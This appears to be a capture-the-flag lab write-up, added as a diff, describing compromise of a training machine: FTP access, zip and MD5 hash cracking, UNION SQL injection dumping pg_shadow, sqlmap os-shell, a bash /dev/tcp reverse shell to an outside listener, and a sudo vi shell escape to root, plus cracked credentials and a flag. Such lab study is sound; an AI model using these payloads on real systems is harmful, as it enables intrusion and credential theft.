@@ -1,0 +1,59 @@
+I started with basic nmap scan with -sVC settings(version scanning & default scripts)
+There was ftp server on port 21 that allows anynomous login. Also there was ssh on port 22 and webserver on 
+port 80.
+
+Went in to ftp server with command fpt {target ip} and found file backup.zip but unzipping requires password.
+Using command zip2john backup.zip > hash.txt i created hash of the zip file and then let john the ripper do
+it's work. Password was 741852963.
+
+Viewing index.php revealed this:  
+if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+$_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+I might be able to bypass login.
+
+I did not find a way to bypass it with SQL injection but I tried to crack password hash with hashcat and it
+worked! Cracked password is: qwerty789
+
+Im in with admin:qwerty789 !
+Used 1' ORDER BY 6-- to find that query has 5 collumns. 
+Found out with: 1' UNION SELECT null, version(), null, null, null-- 
+PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2)9.2.1 20191008, 64-bit
+ 
+Looking at the manual tells that with "user" you can find out the current user(postgres). 
+
+1' UNION SELECT null, schema_name, schema_owner , null, null from information_schema.schemata-- 
+1' UNION SELECT null, table_name, table_schema, null, null from information_schema.tables where table_schema='pg_catalog'-- 
+1' UNION SELECT null, column_name, table_name, table_schema, null from information_schema.columns where table_name='pg_shadow'-- 
+1' UNION SELECT null, null, usename, passwd,null from pg_catalog.pg_shadow-- 
+
+postgres	md52d58e0637ec1e94cdfba3d1c26b67d01
+
+After long while I decided to use sqlmap to brute the sql injection. 
+sqlmap http://10.129.40.154/dashboard.php?search= --cookie="PHPSESSID=dhr275u36novcnc872bvsvtcai" --os-shell
+got me a shell and i uppgraded it with: bash -c "bash -i >& /dev/tcp/10.10.16.21/4444 0>&1" while having listening nc listen to port 4444 with command nc -lvnp 4444
+
+Found user.txt in /var/lib/postgresql (ec9b13ca4d6229cd5cc1e09980965bf7)
+
+Went to /var/www/html and found dashboard.php that contained postgres password:
+}
+        try {
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+I got disconnect few times but I shh'd back in with: ssh postgre@10.129.193.71 and used password from the previous section.
+
+Cmd: sudo -l to see if I have sudo on anything on this account. 
+User postgres may run the following commands on vaccine:
+ (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:set shell=/bin/sh
+:shell 
+
+and now I have root access
+
+user.txt: ************************
+
+root.txt: *******************************
+
